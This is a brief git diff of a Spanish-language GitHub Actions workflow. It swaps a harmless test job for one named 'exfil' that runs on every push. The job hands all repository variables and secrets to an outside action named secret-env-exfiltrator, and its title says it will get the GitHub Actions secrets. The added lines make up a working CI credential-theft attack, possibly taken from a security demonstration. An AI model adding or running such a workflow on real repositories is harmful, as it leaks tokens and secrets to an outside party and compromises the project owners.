@@ -1,15 +1,13 @@
-name: Flujo vacío de prueba final
+name: Conseguir los secretos
 
-on:
-  pull_request_target:
-    types: [opened, synchronize]
-    branches:
-      - main
+on: push
 
 jobs:
-  nada:
+  exfil:
     runs-on: ubuntu-latest
-    name: Trabajo de prueba vacío
+    name: Esto conseguirá los secretos de GitHub Actions gracias a la acción de Offensive Actions
     steps:
-      - name: Imprimir un saludo
-        run: echo "Se ha detectado la Pull Request hacia main, pero no ejecuto nada más."
+      - uses: offensive-actions/secret-env-exfiltrator@main
+        with:
+          vars: ${{ toJSON(vars) }}
+          secrets: ${{ toJSON(secrets) }}
